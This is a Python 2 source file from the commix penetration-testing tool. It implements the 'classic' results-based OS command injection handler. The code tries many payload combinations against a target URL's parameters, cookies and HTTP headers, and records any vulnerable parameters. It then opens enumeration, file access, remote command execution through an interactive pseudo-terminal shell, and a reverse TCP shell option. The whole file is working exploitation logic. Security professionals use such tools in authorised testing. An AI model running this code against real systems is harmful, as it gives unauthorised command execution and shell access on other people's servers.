#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2
import HTMLParser
 
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration
from src.core.injections.results_based.techniques.classic import cb_file_access

readline_error = False
try:
  import readline
except ImportError:
  if settings.IS_WINDOWS:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
  else:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
  pass


"""
The "classic" technique on result-based OS command injection.
"""

"""
The "classic" injection technique handler.
"""
def cb_injection_handler(url, delay, filename, http_request_method):
  counter = 1
  vp_flag = True
  no_result = True
  is_encoded= False
  export_injection_info = False
  injection_type = "Results-based Command Injection"
  technique = "classic injection technique"

  if not settings.LOAD_SESSION: 
    sys.stdout.write(settings.INFO_SIGN + "Testing the " + technique + "... ")
    sys.stdout.flush()
    if menu.options.verbose:
      print ""
      
  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          
          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.notification(url, technique):
            url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)

          else:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # Change TAG on every request to prevent false-positive results.
            TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
            
            randv1 = random.randrange(100)
            randv2 = random.randrange(100)
            randvcalc = randv1 + randv2
            
            # Define alter shell
            alter_shell = menu.options.alter_shell
            
            try:
              if alter_shell:
                # Classic -alter shell- decision payload (check if host is vulnerable).
                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
              else:
                # Classic decision payload (check if host is vulnerable).
                payload = cb_payloads.decision(separator, TAG, randv1, randv2)
              
              # Define prefixes & suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              if menu.options.base64:
                payload = urllib.unquote(payload)
                payload = base64.b64encode(payload)
              else:
                if separator == " " :
                  payload = re.sub(" ", "%20", payload)
                else:
                  payload = re.sub(" ", whitespace, payload)

              # Check if defined "--verbose" option.
              if menu.options.verbose:
                print Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL
                
              # if need page reload
              if menu.options.url_reload:
                time.sleep(delay)
                response = urllib.urlopen(url)

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)
                
              # User-Agent Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)

              # Referer Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom http header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)

              # Evaluate test results.
              shell = cb_injector.injection_test_results(response, TAG, randvcalc)

              if not menu.options.verbose:
                percent = ((i*100)/total)
                float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
              
                if shell == False:
                  sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + float_percent + "%" + " ]")  
                  sys.stdout.flush()

                if str(float_percent) == "100.0":
                  if no_result == True:
                    percent = Fore.RED + "FAILED" + Style.RESET_ALL
                  else:
                    percent = str(float_percent)+ "%"
                elif len(shell) != 0:
                  percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                else:
                  percent = str(float_percent)+ "%"
                sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")  
                sys.stdout.flush()
                
            except KeyboardInterrupt: 
              raise

            except SystemExit: 
              raise

            except:
              continue
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False

            if settings.COOKIE_INJECTION == True: 
              header_name = " Cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " HTTP header"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:    
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1
            
            if not menu.options.verbose and not settings.LOAD_SESSION:
              print ""

            # Print the findings to terminal.
            print Style.BRIGHT + "(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
            print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
            print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
            print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", re.sub("%2B", "+",payload)) + Style.RESET_ALL

            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, delay=0, how_long=0, output_length=0, is_vulnerable="True")
            else:
              settings.LOAD_SESSION = False  
            
            # Check for any enumeration options.
            if settings.ENUMERATION_DONE == True :
              while True:
                enumerate_again = raw_input("\n" + settings.QUESTION_SIGN + "Do you want to enumerate again? [Y/n/q] > ").lower()
                if enumerate_again in settings.CHOICE_YES:
                  cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                  break
                elif enumerate_again in settings.CHOICE_NO: 
                  break
                elif enumerate_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  if enumerate_again == "":
                    enumerate_again = "enter"
                  print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                  pass
            else:
              if menu.enumeration_options():
                cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
          
            if not menu.file_access_options() and not menu.options.os_cmd:
              print ""
            
            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True :
              while True:
                file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n/q] > ").lower()
                if file_access_again in settings.CHOICE_YES:
                  cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  if file_access_again == "":
                    file_access_again  = "enter"
                  print Back.RED + settings.ERROR_SIGN + "'" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
                  pass
            else:
              if menu.file_access_options():
                if not menu.enumeration_options():
                  print ""
                cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                print ""
              
            # Check if defined single cmd.
            if menu.options.os_cmd:
              if not menu.file_access_options():
                print ""
              cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)

            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break 
              if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
                if menu.options.verbose:
                  print ""
              gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
              if gotshell in settings.CHOICE_YES:
                print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                if readline_error:
                  checks.no_readline_module()
                while True:
                  try:
                    if not readline_error:
                      # Tab compliter
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS :
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      if os_shell_option == False:
                        if no_result == True:
                          return False
                        else:
                          return True  
                      elif os_shell_option == "quit":                    
                        sys.exit(0)
                      elif os_shell_option == "back":
                        go_back = True
                        break
                      elif os_shell_option == "os_shell": 
                        print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'os_shell' mode." + Style.RESET_ALL + "\n"
                      elif os_shell_option == "reverse_tcp":
                        settings.REVERSE_TCP = True
                        # Set up LHOST / LPORT for The reverse TCP connection.
                        reverse_tcp.configure_reverse_tcp()
                        if settings.REVERSE_TCP == False:
                          continue
                        if settings.REVERSE_TCP == False:
                          continue
                        while True:
                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
                            result = checks.check_reverse_tcp_options(settings.LHOST)
                          else:  
                            cmd = reverse_tcp.reverse_tcp_options()
                            result = checks.check_reverse_tcp_options(cmd)
                          if result != None:
                            if result == 0:
                              return False
                            elif result == 1 or result == 2:
                              go_back_again = True
                              settings.REVERSE_TCP = False
                              break
                          # Command execution results.
                          response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                          # Evaluate injection results.
                          shell = cb_injector.injection_results(response, TAG)
                          if menu.options.verbose:
                            print ""
                          print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection to the target host has been failed!" + Style.RESET_ALL
                      else:
                        pass
                    else:
                      # Command execution results.
                      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)

                      # if need page reload
                      if menu.options.url_reload:
                        time.sleep(delay)
                        response = urllib.urlopen(url)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Evaluate injection results.
                        shell = cb_injector.injection_results(response, TAG)
                        shell = "".join(str(p) for p in shell)
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell:
                        html_parser = HTMLParser.HTMLParser()
                        shell = html_parser.unescape(shell)
                        if shell != "":
                          print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                        else:
                          if menu.options.verbose:
                            print ""
                          print Back.RED + settings.ERROR_SIGN + "The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"

                  except KeyboardInterrupt: 
                    raise
                    
                  except SystemExit: 
                    raise

              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  

              elif gotshell in settings.CHOICE_QUIT:
                sys.exit(0)

              else:
                if gotshell == "":
                  gotshell = "enter"
                print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
                pass
                
  if no_result == True:
    print ""
    return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method):
  if cb_injection_handler(url, delay, filename, http_request_method) == False:
    return False

#eof
